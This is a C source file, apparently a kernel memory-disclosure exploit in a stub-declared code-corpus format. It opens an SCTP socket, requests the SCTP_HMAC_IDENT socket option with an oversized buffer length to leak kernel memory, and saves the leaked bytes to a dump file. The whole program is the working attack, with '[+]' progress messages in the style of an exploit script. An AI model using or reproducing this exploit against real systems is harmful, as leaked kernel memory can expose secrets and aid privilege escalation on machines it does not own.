
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int socklen_t ;
typedef int FILE ;


 char* DUMP_FILE ;
 int DUMP_SIZE ;
 int IPPROTO_SCTP ;
 int PF_INET ;
 int SCTP_HMAC_IDENT ;
 int SOCK_STREAM ;
 int SOL_SCTP ;
 int errno ;
 int fclose (int *) ;
 int * fopen (char*,char*) ;
 int fwrite (char*,int,int,int *) ;
 int getsockopt (int,int ,int ,char*,int*) ;
 char* malloc (int) ;
 int memset (char*,int ,int) ;
 int printf (char*,...) ;
 int socket (int ,int ,int ) ;
 char* strerror (int ) ;

int
main(int argc, char **argv)
{
 int ret, sock;
 FILE *dumpfile;
 char *memdump, *err;
 socklen_t memlen = DUMP_SIZE;

 memdump = malloc(DUMP_SIZE);
 if (!memdump) {
  err = "malloc(3) failed";
  printf("[-] Error: %s (%s)\n", err, strerror(errno));
  return 1;
 }
 memset(memdump, 0, DUMP_SIZE);

 printf("[+] creating IPPROTO_SCTP socket\n");

 sock = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
 if (sock == -1) {
  err = "socket(2) failed";
  printf("[-] Error: %s (%s)\n", err, strerror(errno));
  return 1;
 }

 printf("[+] getting socket option SCTP_HMAC_IDENT with length of %d\n", memlen);

 ret = getsockopt(sock, SOL_SCTP, SCTP_HMAC_IDENT, memdump, &memlen);
 if (ret == -1) {
  err = "getsockopt(2) failed";
  printf("[-] Error: %s (%s)\n", err, strerror(errno));
  return 1;
 }

 printf("[+] dumping %d bytes of kernel memory to %s\n", memlen, DUMP_FILE);

 dumpfile = fopen(DUMP_FILE, "wb");
 if (!dumpfile) {
  err = "fopen(3) failed";
  printf("[-] Error: %s (%s)\n", err, strerror(errno));
  return 1;
 }
 fwrite(memdump, 1, memlen, dumpfile);
 fclose(dumpfile);

 printf("[+] done.\n");

 return 0;
}
